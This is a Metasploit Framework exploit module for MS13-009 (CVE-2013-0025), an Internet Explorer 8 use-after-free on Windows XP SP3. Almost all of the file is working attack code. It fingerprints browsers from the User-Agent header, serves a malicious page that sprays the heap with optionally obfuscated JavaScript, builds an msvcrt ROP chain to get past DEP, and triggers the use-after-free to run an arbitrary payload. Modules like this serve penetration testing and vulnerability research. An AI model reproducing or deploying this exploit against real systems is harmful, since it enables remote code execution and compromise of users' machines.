##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::RopDb

	def initialize(info={})
		super(update_info(info,
			'Name'           => "MS13-009 Microsoft Internet Explorer SLayoutRun Use-After-Free",
			'Description'    => %q{
				This module exploits a use-after-free vulnerability in Microsoft Internet Explorer
				where a CParaElement node is released but a reference is still kept
				in CDoc. This memory is reused when a CDoc relayout is performed.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Scott Bell <scott.bell@security-assessment.com>' # Vulnerability discovery & Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2013-0025' ],
					[ 'MSB', 'MS13-009' ],
					[ 'URL', 'http://security-assessment.com/files/documents/advisory/ie_slayoutrun_uaf.pdf' ]
				],
			'Payload'	  =>
				{
					'BadChars'       => "\x00",
					'Space'          => 920,
					'DisableNops'    => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'DefaultOptions'  =>
				{
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'	  => 'win',
			'Targets'	  =>
				[
					[ 'Automatic', {} ],
					[ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => 0x5f4 } ]
				],
			'Privileged'	  => false,
			'DisclosureDate'  => "Feb 13 2013",
			'DefaultTarget'   => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)

	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
		ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

		ie_name = "IE #{ie}"

		case nt
		when '5.1'
			os_name = 'Windows XP SP3'
		end

		targets.each do |t|
			if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
				print_status("Target selected as: #{t.name}")
				return t
			end
		end

		return nil
	end

	def heap_spray(my_target, p)
		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))

		js = %Q|

			var heap_obj = new heapLib.ie(0x20000);
			var code = unescape("#{js_code}");
			var nops = unescape("#{js_nops}");
			while (nops.length < 0x80000) nops += nops;
			var offset = nops.substring(0, #{my_target['Offset']});
			var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
			while (shellcode.length < 0x40000) shellcode += shellcode;
			var block = shellcode.substring(0, (0x80000-6)/2);
			heap_obj.gc();
			for (var i=1; i < 0x300; i++) {
				heap_obj.alloc(block);
			}
			var overflow = nops.substring(0, 10);

		|

		js = heaplib(js, {:noobfu => true})

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate

		end

		return js
	end

	def get_payload(t, cli)
		code = payload.encoded

		# No rop. Just return the payload.
		return code if t['Rop'].nil?

		# ROP chain generated by mona.py - See corelan.be
		case t['Rop']
		when :msvcrt
			print_status("Using msvcrt ROP")
			rop_nops = [0x77c39f92].pack("V") * 11 # RETN
			rop_payload = generate_rop_payload('msvcrt', "", {'target'=>'xp'})
			rop_payload << rop_nops
			rop_payload << [0x77c364d5].pack("V") # POP EBP # RETN
			rop_payload << [0x77c15ed5].pack("V") # XCHG EAX, ESP # RETN
			rop_payload << [0x77c35459].pack("V") # PUSH ESP # RETN
			rop_payload << [0x77c39f92].pack("V") # RETN
			rop_payload << [0x0c0c0c8c].pack("V") # Shellcode offset
			rop_payload << code
		end

		return rop_payload
	end

	def get_exploit(my_target, cli)
		p  = get_payload(my_target, cli)
		js = heap_spray(my_target, p)

		html = %Q|
		<!doctype html>
		<html>
		<head>
		<script>
		#{js}
		</script>
		<script>
		var data;
		var objArray = new Array(1150);

		setTimeout(function(){
			document.body.style.whiteSpace = "pre-line";

			CollectGarbage();

			for (var i=0;i<1150;i++){
				objArray[i] = document.createElement('div');
				objArray[i].className = data += unescape("%u0c0c%u0c0c");
			}

			setTimeout(function(){document.body.innerHTML = "boo"}, 100)
		}, 100)

		</script>
		</head>
		<body>
		<p> </p>
		</body>
		</html>
		|

		return html
	end


	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		uri   = request.uri
		print_status("Requesting: #{uri}")

		my_target = get_target(agent)
		# Avoid the attack if no suitable target found
		if my_target.nil?
			print_error("Browser not supported, sending 404: #{agent}")
			send_not_found(cli)
			return
		end

		html = get_exploit(my_target, cli)
		html = html.gsub(/^\t\t/, '')
		print_status "Sending HTML..."
		send_response(cli, html, {'Content-Type'=>'text/html'})

	end

end

